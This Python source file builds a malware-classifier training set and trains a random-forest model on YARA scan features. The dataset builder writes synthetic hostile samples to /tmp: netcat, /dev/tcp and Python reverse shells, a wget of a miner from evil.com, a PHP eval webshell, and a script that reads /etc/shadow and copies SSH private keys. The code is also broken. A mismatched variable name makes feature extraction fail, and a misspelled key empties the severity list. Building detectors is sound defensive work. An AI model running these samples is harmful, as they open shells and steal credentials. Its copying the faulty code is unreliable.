import os 
import json
import numpy as np
import pickle
from pathlib import Path
from scanner import load_rules, scan_file

MODEL_PATH = "models/classifier.pkl"
DATASET_PATH = "models/dataset.json"

SUSPICIOUS_EXTENSIONS = [".sh", ".py", ".php", ".pl", ".rb", ".elf", ".bin"]
SUSPICIOUS_DIRS = ["/tmp", "/var/tmp", "/dev/shm", "/run"]

def extract_features(filepath, rules):
	result = scan_file(filepath, rules)
	meta = result.get("metadata", {})

	entropy = meta.get("entropy") or 0.0
	size = meta.get("size_bytes") or 0
	log_size = np.log1p(size)
	is_exec = int(meta.get("is_executable", False))
	ext = meta.get("extension", "")
	is_suspicious_ext = int(ext in SUSPICIOUS_EXTENSIONS)
	abs_path = os.path.abspath(filepath)
	is_Suspicious_diir = int(any(abs_path.startswith(d) for d in SUSPICIOUS_DIRS))
	yara_hit = int(result["status"] == "infected")
	yara_count = len(result.get("matches", []))
	severities = [m["severity"] for m in result.get("matchces", [])]
	has_critical = int("critical" in severities)
	high_entropy = int(entropy > 6.5)

	features = [entropy,log_size,is_exec,is_suspicious_ext, is_suspicious_dir,yara_hit,yara_count,has_critical,high_entropy]
	return features, result

def build_training_data():
    """
    Build a labeled dataset from sample files.
    Label 1 = malware, 0 = clean.
    Scans known clean dirs and our test malware files.
    """
    rules = load_rules()
    dataset = []

    # clean samples — scan system binaries and config files
    clean_paths = [
        "/usr/bin",
        "/etc",
        "/usr/lib/python3"
    ]

    print("[*] Collecting clean samples...")
    for dirpath in clean_paths:
        if not os.path.exists(dirpath):
            continue
        for root, dirs, files in os.walk(dirpath):
            for fname in files[:20]:  # cap at 20 per dir to keep dataset balanced
                fpath = os.path.join(root, fname)
                try:
                    features, _ = extract_features(fpath, rules)
                    dataset.append({"features": features, "label": 0, "file": fpath})
                except Exception:
                    continue

    # malware samples — create synthetic malware files
    print("[*] Collecting malware samples...")
    malware_samples = [
        ("/tmp/mal_shell.sh",    "#!/bin/bash\nnc -e /bin/sh 192.168.1.1 4444\nbash -i >& /dev/tcp/192.168.1.1/4444 0>&1"),
        ("/tmp/mal_miner.sh",    "wget http://evil.com/xmrig && chmod +x xmrig && nohup ./xmrig --pool stratum+tcp://pool.minexmr.com:4444 &"),
        ("/tmp/mal_webshell.php","<?php eval(base64_decode($_POST['cmd'])); system($_GET['cmd']); ?>"),
        ("/tmp/mal_python.py",   "import socket,subprocess,os\ns=socket.socket()\ns.connect(('192.168.1.1',4444))\nos.dup2(s.fileno(),0)\nsubprocess.Popen(['/bin/sh'])"),
        ("/tmp/mal_creds.sh",    "cat /etc/shadow && cat /etc/passwd && cp ~/.ssh/id_rsa /tmp/out"),
        ("/tmp/mal_ransom.py",   "import os\nfor r,d,f in os.walk('/home'):\n  for file in f:\n    os.rename(file, file+'.locked')\nprint('YOUR FILES HAVE BEEN ENCRYPTED')"),
    ]

    for fpath, content in malware_samples:
        with open(fpath, "w") as f:
            f.write(content)
        try:
            features, _ = extract_features(fpath, rules)
            dataset.append({"features": features, "label": 1, "file": fpath})
        except Exception:
            continue

    print(f"[+] Dataset built: {len(dataset)} samples")
    print(f"    Clean   : {sum(1 for d in dataset if d['label'] == 0)}")
    print(f"    Malware : {sum(1 for d in dataset if d['label'] == 1)}")

    os.makedirs("models", exist_ok=True)
    with open(DATASET_PATH, "w") as f:
        json.dump(dataset, f, indent=2)

    return dataset


def train_model():
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.model_selection import train_test_split
    from sklearn.metrics import classification_report

    if not os.path.exists(DATASET_PATH):
        dataset = build_training_data()
    else:
        with open(DATASET_PATH) as f:
            dataset = json.load(f)

    X = np.array([d["features"] for d in dataset])
    y = np.array([d["label"] for d in dataset])

    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )

    clf = RandomForestClassifier(n_estimators=100, random_state=42)
    clf.fit(X_train, y_train)

    y_pred = clf.predict(X_test)
    print("\n[+] Model trained successfully")
    print(classification_report(y_test, y_pred, target_names=["clean", "malware"]))

    os.makedirs("models", exist_ok=True)
    with open(MODEL_PATH, "wb") as f:
        pickle.dump(clf, f)
    print(f"[+] Model saved to {MODEL_PATH}")

    return clf


def load_model():
    if not os.path.exists(MODEL_PATH):
        raise FileNotFoundError("No trained model found. Run train first.")
    with open(MODEL_PATH, "rb") as f:
        return pickle.load(f)


def predict_file(filepath, rules=None, model=None):
    if rules is None:
        rules = load_rules()
    if model is None:
        model = load_model()

    features, scan_result = extract_features(filepath, rules)
    X = np.array([features])
    prediction = model.predict(X)[0]
    confidence = model.predict_proba(X)[0][prediction]

    return {
        "file": filepath,
        "prediction": "malware" if prediction == 1 else "clean",
        "confidence": round(float(confidence), 4),
        "yara_status": scan_result["status"],
        "features": {
            "entropy": features[0],
            "log_size": features[1],
            "is_executable": bool(features[2]),
            "suspicious_extension": bool(features[3]),
            "suspicious_directory": bool(features[4]),
            "yara_hit": bool(features[5]),
            "yara_rule_count": features[6],
            "has_critical": bool(features[7]),
            "high_entropy": bool(features[8])
        }
    }
